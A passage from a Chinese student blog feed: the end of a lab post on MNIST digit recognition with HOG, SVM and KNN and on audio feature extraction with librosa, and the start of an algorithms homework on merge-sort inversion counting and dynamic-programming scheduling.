class="keyword">return</span> vis</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取mnist测试数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mnist</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="string">"mnist"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">    files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line">    s = <span class="string">""</span> <span class="comment">#全部文件名字符串</span></span><br><span class="line">    digits_img=[] <span class="comment">#图片数组</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">            s=s+file</span><br><span class="line">            print(<span class="string">'loading "%s" ...'</span> % file)<span class="comment">#加载某个文件</span></span><br><span class="line">            img = cv.imread(<span class="string">"mnist//"</span>+file, <span class="number">0</span>)<span class="comment">#读取图片</span></span><br><span class="line">            <span class="comment">#resize为20*20</span></span><br><span class="line">            img = cv.resize(img, (<span class="number">20</span>, <span class="number">20</span>), interpolation=cv.INTER_AREA)</span><br><span class="line">            digits_img.append(img)</span><br><span class="line">    <span class="comment"># 改为np数组</span></span><br><span class="line">    digits_img = np.array(digits_img)</span><br><span class="line">    <span class="comment"># lable数组</span></span><br><span class="line">    labels = np.repeat(np.arange(<span class="number">10</span>), len(digits_img) / <span class="number">10</span>)</span><br><span class="line">    print(s)  <span class="comment"># 打印读取的文件名</span></span><br><span class="line">    <span class="keyword">return</span> digits_img,labels</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试mnist数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_mnist</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#加载数据集</span></span><br><span class="line">    digits_img,labels=read_mnist()</span><br><span class="line">    <span class="comment"># 纠正图片倾斜</span></span><br><span class="line">    digits2 = list(map(deskew, digits_img))</span><br><span class="line">    <span class="comment"># 计算hog特征</span></span><br><span class="line">    samples = preprocess_hog(digits2)   </span><br><span class="line">    <span class="comment">#展示test数据集</span></span><br><span class="line">    cv.imshow(<span class="string">'test set'</span>, mosaic(<span class="number">16</span>, digits_img))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#SVM模型分类</span></span><br><span class="line">    model=cv.ml.SVM_load(<span class="string">'SVM.dat'</span>)</span><br><span class="line">    vis = evaluate_model_2(model, digits2, samples, labels)</span><br><span class="line">    cv.imshow(<span class="string">'SVM test'</span>, mosaic(<span class="number">16</span>, vis))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#KNN模型分类</span></span><br><span class="line">    model=cv.ml.KNearest_load(<span class="string">'KNearest.dat'</span>)</span><br><span class="line">    vis = evaluate_model_2(model, digits2, samples, labels)</span><br><span class="line">    cv.imshow(<span class="string">'KNN test'</span>, mosaic(<span class="number">16</span>, vis))</span><br><span class="line"></span><br><span class="line">    cv.waitKey(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test_mnist()</span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<p>可以看到，OCR效果还是不错的</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504191549805.png" alt="image-20200504191549805"></p>
<h1 id="2、音频实验"><a href="#2、音频实验" class="headerlink" title="2、音频实验"></a>2、音频实验</h1><h2 id="2-1-背景介绍"><a href="#2-1-背景介绍" class="headerlink" title="2.1 背景介绍"></a>2.1 背景介绍</h2><p>本节实验课，实践音频的相关操作和库，以及一些基本特征的提取。</p>
<p>使用了实验自带的音频</p>
<p><audio id="audio" controls preload="none"> <source id="mp3" src="2020-05-03-information-security-exp-3/1.wav"> </audio></p>
<p>第一个实验（读取音频信息）用到的库：</p>
<blockquote>
<p>音频库：wave 库 <em><a href="https://docs.python.org/3/library/wave.html" target="_blank" rel="noopener">https://docs.python.org/3/library/wave.html</a></em> </p>
<p>绘图库：pylab库，这是 Matplotlib 和Ipython提供的一个模块，提供了类似Matlab的语法</p>
<p>Matplotlib是一个Python的图形框架，类似于MATLAB，同时还可以使用内嵌的latex引擎绘制的数学公式。</p>
<p>LibROSA是python用于音乐、音频分析的一个工具包。官方文档：<a href="http://librosa.github.io/librosa/" target="_blank" rel="noopener">http://librosa.github.io/librosa/</a></p>
</blockquote>
<p>第二个实验（读取音频特征）用到的库：</p>
<blockquote>
<p>安装LibROSA ：</p>
<p>windows命令行下pip install librosa</p>
<p>或anaconda命令行下conda install -c conda-forge librosa</p>
<p>LibROSA需要ffmpeg支持（用于音频和视频多种格式的录影、转换、流功能）</p>
<p>安装ffmpeg：</p>
<p>ffmpeg下载<a href="https://www.ffmpeg.org/download.html" target="_blank" rel="noopener">https://www.ffmpeg.org/download.html</a></p>
<p>配置环境向量<a href="http://alleni123.iteye.com/blog/2028433" target="_blank" rel="noopener">http://alleni123.iteye.com/blog/2028433</a></p>
</blockquote>
<h2 id="2-2-使用wave读取音频文件的信息"><a href="#2-2-使用wave读取音频文件的信息" class="headerlink" title="2.2 使用wave读取音频文件的信息"></a>2.2 使用wave读取音频文件的信息</h2><ul>
<li><strong>采样率</strong><br>外界的声音都是模拟信号，在数字设备中A/D转化成为了由0、1表示的数字信号后被储存下来。数字信号都是离散的，所以采样率是指一秒钟采样的次数，采样率越高，还原的声音也就越真实。由于人耳听觉范围是20Hz~20kHz，根据香农采样定理(也叫奈奎斯特采样定理)，理论上来说采样率大于40kHz的音频格式都可以称之为<strong>无损格式</strong>。</li>
<li>*<em>位深度 *</em><br>若要尽可能精确地还原声音，只有高采样率是不够的。描述一个采样点，横轴(时间)代表采样率，纵轴(幅度)代表位深度。</li>
<li><strong>码率</strong><br>在无损无压缩格式中(如.wav)，码率=采样率x位深度x声道数。在有损压缩中(如.mp3)码率便不等于这个公式了，因为原始信息已经被破坏。</li>
<li><strong>奈奎斯特采样定律</strong>：在进行模拟/数字信号的转换过程中，当采样频率fs.max大于信号中最高频率fmax的2倍时(fs.max&gt;2fmax)，采样之后的数字信号完整地保留了原始信号中的信息。</li>
<li><strong>人耳听音频率范围</strong>： 20Hz～20kHz标准格式化的WAV文件和CD格式一样，采样频率为44.1K。</li>
<li><strong>无损编码</strong>： 能够由编码后的数据完全无误地恢复原始信号采样值。常见的无损编码格式：APE、FLAC。</li>
<li><strong>有损编码</strong>：  根据人耳对不同频率的声音感知敏感度不同，在压缩过程中损失一部分音质以换取更高的压缩比，由于编码过程中有信息的损失，无法完全恢复原始信号。</li>
</ul>
<p>代码如下，说明已在代码中详细注释标出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> pl</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">f = wave.open(<span class="string">r"1.wav"</span>,<span class="string">"rb"</span>)</span><br><span class="line"><span class="comment"># 读取格式信息</span></span><br><span class="line">params = f.getparams()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取wav文件信息（依次为声道数、位深度、采样频率、采样点数）</span></span><br><span class="line">nchannels, sampwidth, framerate, nframes = params[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">"声道数："</span>,nchannels)</span><br><span class="line">print(<span class="string">"位深度："</span>,sampwidth)</span><br><span class="line">print(<span class="string">"采样频率："</span>,framerate)</span><br><span class="line">print(<span class="string">"采样点数："</span>,nframes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取波形数据</span></span><br><span class="line">str_data = f.readframes(nframes)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#将波形数据转换为数组</span></span><br><span class="line">wave_data = np.fromstring(str_data, dtype=np.short)</span><br><span class="line"><span class="comment">#该文件为双声道，数组列数为2</span></span><br><span class="line">wave_data.shape = <span class="number">-1</span>, <span class="number">2</span></span><br><span class="line">wave_data = wave_data.T</span><br><span class="line"><span class="comment">#时长为总点数/频率</span></span><br><span class="line">time = np.arange(<span class="number">0</span>, nframes) * (<span class="number">1.0</span> / framerate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制波形</span></span><br><span class="line">pl.subplot(<span class="number">211</span>)</span><br><span class="line"><span class="comment">#声道1（左声道），蓝色</span></span><br><span class="line">pl.plot(time, wave_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">pl.subplot(<span class="number">212</span>)</span><br><span class="line"><span class="comment">#声道2（右声道）,绿色</span></span><br><span class="line">pl.plot(time, wave_data[<span class="number">1</span>], c=<span class="string">"g"</span>)</span><br><span class="line"><span class="comment">#横轴为时间、纵轴为幅度的量化值</span></span><br><span class="line">pl.xlabel(<span class="string">"time (seconds)"</span>)</span><br><span class="line">pl.show()</span><br></pre></td></tr></table></figure>

<p>音频基本信息如下所示：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504152416006.png" alt="image-20200504152416006"></p>
<p>音频波形图：</p>
<p>蓝色部分为声道1（左声道），绿色部分为声道2（右声道）横轴为时间、纵轴为幅度的量化值：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504152437022.png" alt="image-20200504152437022"></p>
<h2 id="2-3-使用LibROSA分别计算音频的MFCC和Chroma特征"><a href="#2-3-使用LibROSA分别计算音频的MFCC和Chroma特征" class="headerlink" title="2.3 使用LibROSA分别计算音频的MFCC和Chroma特征"></a>2.3 使用LibROSA分别计算音频的MFCC和Chroma特征</h2><p>每个音频信号都包含许多特征。但是，我们必须提取与我们试图解决的问题相关的特征。提取要使用它们进行分析的特征的过程称为特征提取，让我们详细研究一些特征。</p>
<p><strong>音频特征基础：</strong></p>
<p>谐波、冲击源分离（Harmonic Percussive Source Separation, HPSS）</p>
<p>一般而言，音乐信号在频谱图通常呈面两种形式分布，一种是沿时间轴连续平滑分布，另一种是沿频率轴连续平滑分布，通常将这两种分布的音源分别称作<strong>谐波源</strong>和<strong>冲击源</strong>。乐器可大致分为管弦乐器和打击乐器。管弦乐器产生的音源一般舒缓，音与音之间连续衔接，且频谱图上表现为平滑的包络，常见的管弦乐器有笛子、筝、小提琴、钢琴（钢琴虽不是严格意义上的管弦乐器，但其音源的频谱具有管弦乐音源的特征，因此这里将其归为一类）等。与之相反，打击乐器产生的音源一般有强烈的节奏感，音与音之间有较大的跨度在频谱图上表现为垂直包络，常见的打击乐器有鼓、木琴、小军鼓、锣等。因此在频谱图上，将管弦乐所产生的音源通常称之为谐波源，打击乐产生的音源通常称之为冲击源。谐波源通常包含固定音调，能在频谱上形成一系列平滑的瞬时包络，因此在时间轴方向上是平滑连续的，在频率轴方向上间断的；反之，冲击源一般集中在较短时间内，在频谱上形成一系列垂直的宽带谱包络，因此在时间轴方向上是间断的，在频率轴方向上是平滑连续的。</p>
<p><strong>在计算音频特征时，会根据这两种信号的不同特点，进行分离后分别进行特征计算。比如chroma特征就只使用了谐波源作为源数据</strong></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504154037385.png" alt="image-20200504154037385"></p>
<p><strong>音频特征：</strong></p>
<ul>
<li><p>MFCC(Mel-frequency cepstral coefficients)</p>
<p>梅尔频率倒谱系数。梅尔频率是基于人耳听觉特性提出来的， 它与Hz频率成非线性对应关系。</p>
<p>当频率在1000Hz以下时，人耳的听觉能力与声音频率呈线性增长，当频率在1000Hz以上时，与声音的频率呈对数分布。梅尔频率倒谱系数(MFCC)则是利用它们之间的这种关系，计算得到的Hz频谱特征。主要用于语音数据特征提取和降低运算维度。</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504153802954.png" alt="image-20200504153802954"></p>
</li>
<li><p>Chroma色度特征是色度向量（Chroma Vector）和色度图谱（Chromagram）的统称。色度向量是一个含有12个元素的向量，这些元素分别代表一段时间（如1帧）内12个音级中的能量，不同八度的同一音级能量累加，色度图谱则是色度向量的序列。色度特征的计算，参考：Automatic Chord Estimation from Audio: A R</p>
<p>eview of the State of the Art，过程如下图：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504153901633.png" alt="image-20200504153901633"></p>
</li>
</ul>
<p><strong>提取MFCC和Chroma</strong></p>
<p>提取MFCC和Chroma的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># Feature extraction example</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> librosa</span><br><span class="line"><span class="keyword">import</span> librosa.display</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment">#加载音频</span></span><br><span class="line"><span class="comment"># Load the example clip</span></span><br><span class="line">y, sr = librosa.load(<span class="string">"1.wav"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the hop length; at 22050 Hz, 512 samples ~= 23ms</span></span><br><span class="line">hop_length = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#时序y被分为信号的谐波和冲击两个时序，都与y有着相同的形状和时间长度。</span></span><br><span class="line"><span class="comment">#划分的意义：首先， percussive能够更好地表示节奏信息，意味着它能提供更稳定地节拍跟踪结果。</span></span><br><span class="line"><span class="comment">#其次， percussive在所有频带上都会贡献能量,会污染声调特征chroma，所以在计算chroma时会把percussive去掉。</span></span><br><span class="line"><span class="comment"># Separate harmonics and percussives into two waveforms</span></span><br><span class="line">y_harmonic, y_percussive = librosa.effects.hpss(y) <span class="comment">#频域内的谐波冲击波分离</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#冲击信号计算节拍</span></span><br><span class="line"><span class="comment"># Beat track on the percussive signal</span></span><br><span class="line">Tempo, beat_frames = librosa.beat.beat_track(y=y_percussive,sr=sr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算MFCC特征</span></span><br><span class="line"><span class="comment"># Compute MFCC features from the raw signa</span></span><br><span class="line">mfcc = librosa.feature.mfcc(y=y, sr=sr, hop_length=hop_length, n_mfcc=<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算每帧之间MFCC的一阶差分</span></span><br><span class="line"><span class="comment"># And the first-order differences (delta features)</span></span><br><span class="line">mfcc_delta = librosa.feature.delta(mfcc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 叠加并同步MFCC特征</span></span><br><span class="line"><span class="comment"># Stack and synchronize between beat events</span></span><br><span class="line"><span class="comment"># This time, we’ll use the mean value (default) instead of median</span></span><br><span class="line">beat_mfcc_delta = librosa.util.sync(np.vstack([mfcc, mfcc_delta]),beat_frames)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用谐波计算色度特征</span></span><br><span class="line"><span class="comment"># Compute chroma features from the harmonic signa</span></span><br><span class="line">chromagram = librosa.feature.chroma_cqt(y=y_harmonic,sr=sr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#整合色度特征</span></span><br><span class="line"><span class="comment"># Aggregate chroma features between beat events</span></span><br><span class="line"><span class="comment"># We’ll use the median value of each feature between beat frames</span></span><br><span class="line">beat_chroma = librosa.util.sync(chromagram,beat_frames,aggregate=np.median)</span><br><span class="line"></span><br><span class="line"><span class="comment">#叠加所有特征</span></span><br><span class="line"><span class="comment"># Finally, stack all beat-synchronous features togethe</span></span><br><span class="line">beat_features = np.vstack([beat_chroma, beat_mfcc_delta])</span><br><span class="line"><span class="comment">#得到beat_features的维度为(12 + 13 + 13, # beat intervals)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#绘制mfcc特征图</span></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">librosa.display.specshow(mfcc, sr=sr, x_axis=<span class="string">'time'</span>)</span><br><span class="line">plt.title(<span class="string">'mfcc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绘制chroma特征图</span></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">librosa.display.specshow(chromagram, sr=sr,y_axis=<span class="string">'chroma'</span>, x_axis=<span class="string">'time'</span>, hop_length=hop_length, cmap=<span class="string">'coolwarm'</span>)</span><br><span class="line">plt.title(<span class="string">'chromagram'</span>)</span><br><span class="line"></span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>如下为我们的mfcc和chroma的特征图</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504155357411.png" alt="image-20200504155357411"></p>
<h2 id="2-4-提取过零率特征"><a href="#2-4-提取过零率特征" class="headerlink" title="2.4 提取过零率特征"></a>2.4 提取过零率特征</h2><p>过零率（zero crossing rate）是一个信号符号变化的比率，即，在每帧中，语音信号从正变为负或从负变为正的次数。 这个特征已在语音识别和音乐信息检索领域得到广泛使用，通常对类似金属、摇滚等高冲击性的声音的具有更高的价值。</p>
<p>该特征在语音识别和音乐信息检索中都被大量使用。对于像金属和岩石那样的高冲击声，它通常具有更高的值。让我们计算示例音频片段的过零率。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> librosa.display</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 加载信号</span></span><br><span class="line">x, sr = librosa.load(<span class="string">"1.wav"</span>)</span><br><span class="line"><span class="comment">#绘制信号波形图</span></span><br><span class="line"><span class="comment"># plt.figure(figsize=(14, 5))</span></span><br><span class="line"><span class="comment"># librosa.display.waveplot(x, sr=sr)</span></span><br><span class="line"><span class="comment"># 放大n0~n1区间，绘制过零点</span></span><br><span class="line">n0 = <span class="number">9000</span></span><br><span class="line">n1 = <span class="number">9100</span></span><br><span class="line">plt.figure(figsize=(<span class="number">14</span>, <span class="number">5</span>))</span><br><span class="line">plt.plot(x[n0:n1])</span><br><span class="line">plt.grid()</span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment">#计算在n0~n1区间的过零率数目</span></span><br><span class="line">zero_crossings = librosa.zero_crossings(x[n0:n1], pad=<span class="literal">False</span>)</span><br><span class="line">print(sum(zero_crossings))</span><br></pre></td></tr></table></figure>

<p>在这段区间（9000~9100）有11个过零点</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504160541818.png" alt="image-20200504160541818"></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504160027498.png" alt="image-20200504160027498"></p>
<h2 id="2-5-提取光谱质心特征"><a href="#2-5-提取光谱质心特征" class="headerlink" title="2.5 提取光谱质心特征"></a>2.5 提取光谱质心特征</h2><p>光谱质心(Spectral Centroid)指示声音的“质心”位于何处，并按照声音的频率的加权平均值来加以计算。 假设现有两首歌曲，一首是蓝调歌曲，另一首是金属歌曲。现在，与同等长度的蓝调歌曲相比，金属歌曲在接近尾声位置的频率更高。所以蓝调歌曲的频谱质心会在频谱偏中间的位置，而金属歌曲的频谱质心则靠近频谱末端。</p>
<p>librosa.feature.spectral_centroid 计算信号中每帧的光谱质心：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504160815181.png" alt="image-20200504160815181"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> librosa.display</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 加载信号</span></span><br><span class="line"><span class="keyword">import</span> sklearn</span><br><span class="line"></span><br><span class="line">x, sr = librosa.load(<span class="string">"1.wav"</span>)</span><br><span class="line"></span><br><span class="line">spectral_centroids = librosa.feature.spectral_centroid(x, sr=sr)[<span class="number">0</span>]</span><br><span class="line">print(spectral_centroids.shape)</span><br><span class="line"><span class="comment"># (2647,)</span></span><br><span class="line"><span class="comment">#计算可视化时间变量</span></span><br><span class="line"><span class="comment"># Computing the time variable for visualization</span></span><br><span class="line">frames = range(len(spectral_centroids))</span><br><span class="line">t = librosa.frames_to_time(frames)</span><br><span class="line"><span class="comment">#标准化光谱质心以进行可视化</span></span><br><span class="line"><span class="comment"># Normalising the spectral centroid for visualisation</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(x, axis=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sklearn.preprocessing.minmax_scale(x, axis=axis)</span><br><span class="line"><span class="comment">#可视化光谱质心</span></span><br><span class="line"><span class="comment">#Plotting the Spectral Centroid along the waveform</span></span><br><span class="line">librosa.display.waveplot(x, sr=sr, alpha=<span class="number">0.4</span>)</span><br><span class="line">plt.plot(t, normalize(spectral_centroids), color=<span class="string">'r'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<p>LIBROSA处理音频信号   <a href="https://www.freesion.com/article/4795221829/" target="_blank" rel="noopener">https://www.freesion.com/article/4795221829/</a></p>
<h1 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h1><ul>
<li>这次实验挺有趣的，难度也适中。</li>
<li>大多数时候出错，都是api不熟悉导致的，多看多敲就好了。</li>
<li>图像处理部分的透视变化、numpy的熟悉、HOG特征的计算、KNN、SVM聚类的学习。音频部分对音频特征和参数的介绍等等，学到了很多东西。</li>
<li>但是，信息数据处理才是刚刚入了一点点门，还得继续努力才是。</li>
</ul>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-04-30-algorithm-homework-2</title>
    <url>/2020/04/30/2020-04-30-algorithm-homework-2/</url>
    <content><![CDATA[<h1 id="1-明显倒置问题——分治"><a href="#1-明显倒置问题——分治" class="headerlink" title="1.明显倒置问题——分治"></a>1.明显倒置问题——分治</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427220820331.png" alt="image-20200427220820331"></p>
<h2 id="1-1-描述算法思想"><a href="#1-1-描述算法思想" class="headerlink" title="1.1 描述算法思想"></a>1.1 描述算法思想</h2><p>我们可以再归并排序的基础上来计算明显倒置。</p>
<ul>
<li>分治：将一列数字平分为左右两列数字</li>
<li>治理：左右两列数字分别计算其明显倒置个数A、B</li>
<li>合并：计算左列右列（i在左列，j在右列）所含的明显倒置个数C，A+B+C即为明显倒置的总个数</li>
</ul>
<h2 id="1-2-写出算法伪代码"><a href="#1-2-写出算法伪代码" class="headerlink" title="1.2 写出算法伪代码"></a>1.2 写出算法伪代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MS_OI</span><span class="params">(lists)</span>:</span>  <span class="comment">#merge_sort_Obvious_inversion</span></span><br><span class="line">    <span class="keyword">if</span> len(lists) &lt;= <span class="number">1</span>: <span class="comment">#若list个数小于一，直接返回</span></span><br><span class="line">        <span class="keyword">return</span> lists,<span class="number">0</span></span><br><span class="line">    middle = len(lists)/<span class="number">2</span>	<span class="comment">#mid是向下取整的数组中间指针</span></span><br><span class="line">    left,numA = MS_OI(lists[:middle]) <span class="comment">#计算有序左数组，以及左数组明显倒置个数</span></span><br><span class="line">    right,numB = MS_OI(lists[middle:]) <span class="comment">#计算有序右数组，以及右数组明显倒置个数</span></span><br><span class="line">    lists_sort,numC=merge_OV(left, right)<span class="comment">#计算有序list，以及左列右列数组明显倒置个数</span></span><br><span class="line">	<span class="keyword">return</span> lists_sort,(numA+numB+numC)   <span class="comment">#返回有序list，以及总明显倒置个数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_OV</span><span class="params">(left, right)</span>:</span></span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    c = []  <span class="comment">#合并结果数组</span></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    left_R=len(left)<span class="number">-1</span>  <span class="comment">#left数组最右边元素的下标，这里-1是因为python的数组从零开始</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(left) <span class="keyword">and</span> j &lt; len(right):</span><br><span class="line">        <span class="keyword">if</span> left[i] &lt; right[j]:  <span class="comment">#如果左数组当前元素i小于右数组当前元素j，则不满足“明显倒置”</span></span><br><span class="line">            c.append(left[i])</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:					<span class="comment">#如果左数组当前元素i小于右数组当前元素j，则满足“倒置”</span></span><br><span class="line">            <span class="keyword">if</span>(left[i] &gt; <span class="number">2</span>*right[j]):  <span class="comment">#在满足“倒置”的前提下，还满足“明显倒置”</span></span><br><span class="line">                num=num+<span class="number">1</span>		<span class="comment">#首先对这个明显倒置加1</span></span><br><span class="line">                <span class="comment">#因为在left数组中[i]右边的元素都大于[i]，都与当前的right[j]构成“明显倒置”</span></span><br><span class="line">                <span class="comment">#所以left数组中[i]右边的元素有多少个，num就加多少，即len(left)-i</span></span><br><span class="line">                num=num+left_R-i</span><br><span class="line">            c.append(right[j])</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == len(left): <span class="comment">#如果left数组已经遍历完，则把right剩下的直接全移到合并数组中</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> right[j:]:</span><br><span class="line">            c.append(x)</span><br><span class="line">    <span class="keyword">else</span>:			   <span class="comment">#如果right数组已经遍历完，则把left剩下的直接全移到合并数组中</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> left[i:]:</span><br><span class="line">            c.append(x)</span><br><span class="line">    <span class="keyword">return</span> c,num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = [<span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>]</span><br><span class="line">    lists_sort,num=MS_OI(a) <span class="comment">#计算num</span></span><br><span class="line">    print(num)</span><br></pre></td></tr></table></figure>

<h2 id="1-3-分析算法时间复杂度"><a href="#1-3-分析算法时间复杂度" class="headerlink" title="1.3 分析算法时间复杂度"></a>1.3 分析算法时间复杂度</h2><p>时间复杂度与归并排序的相同，都为nlog(n)</p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427225822702.png" alt="image-20200427225822702"></p>
<h1 id="2-工作最优安排问题——动态规划"><a href="#2-工作最优安排问题——动态规划" class="headerlink" title="2.工作最优安排问题——动态规划"></a>2.工作最优安排问题——动态规划</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427225957321.png" alt="image-20200427225957321"></p>
<h2 id="2-1-描述算法思路"><a href="#2-1-描述算法思路" class="headerlink" title="2.1 描述算法思路"></a>2.1 描述算法思路</h2><p>这道题和我们之前做的  阿里面试题之求括号数、求走楼梯的方法数类似，都是一个数组内的线性规划问题。</p>
<p>我们用一个数组OPT来表示这道题，数组值对应各天最优解，明显是满足最优子结构的。</p>
<ul>
<li>首先计算0到2天的最优值，即两天之内的情况都工作不用休息<ul>
<li>OPT[0]=0、OPT[1]=w[1]、OPT[2]=w[1]+w[2]</li>
</ul>
</li>
<li>我们从i=3-&gt;k来遍历计算这个数组，对于每个OPT[i]，有三种情况：<ul>
<li>1天前的最优值+1天休息：OPT[i]=OPT[i-1]</li>
<li>2天前的最优值+1天休息+1天工作：OPT[i]=OPT[i-2]+w[i]</li>
<li>3天前的最优值+1天休息+2天工作：OPT[i]=OPT[i-3]+w[i-1]+w[i]</li>
</ul>
</li>
</ul>
<h2 id="2-2-OPT-k-递推式"><a href="#2-2-OPT-k-递推式" class="headerlink" title="2.2 OPT(k)递推式"></a>2.2 OPT(k)递推式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># OPT(0)=0</span></span><br><span class="line"><span class="comment"># OPT(1)=w[1]</span></span><br><span class="line"><span class="comment"># OPT(2)=w[2]</span></span><br><span class="line">OPT(k)=max(OPT(k<span class="number">-1</span>),OPT(k<span class="number">-2</span>)+w[k],OPT(k<span class="number">-3</span>)+w[k<span class="number">-1</span>]+w[k])</span><br></pre></td></tr></table></figure>

<h2 id="2-3-写出算法伪代码"><a href="#2-3-写出算法伪代码" class="headerlink" title="2.3 写出算法伪代码"></a>2.3 写出算法伪代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work_arrange</span><span class="params">(w)</span></span></span><br><span class="line">	OPT=[len(w)]</span><br><span class="line">    <span class="keyword">if</span> len(w)&gt;=<span class="number">1</span>:	 <span class="comment">#一天（含）以上的OPT安排	</span></span><br><span class="line">        OPT[<span class="number">0</span>]=w[<span class="number">0</span>]  <span class="comment">#w[0]是工作第0天工作的工资，为零</span></span><br><span class="line">        OPT[<span class="number">1</span>]=w[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(w)&gt;=<span class="number">2</span>:	 <span class="comment">#两天（含）以上的OPT安排</span></span><br><span class="line">        OPT[<span class="number">2</span>]=w[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:			<span class="comment">#三天（含）以上的OPT安排</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">3</span> to len(w):  <span 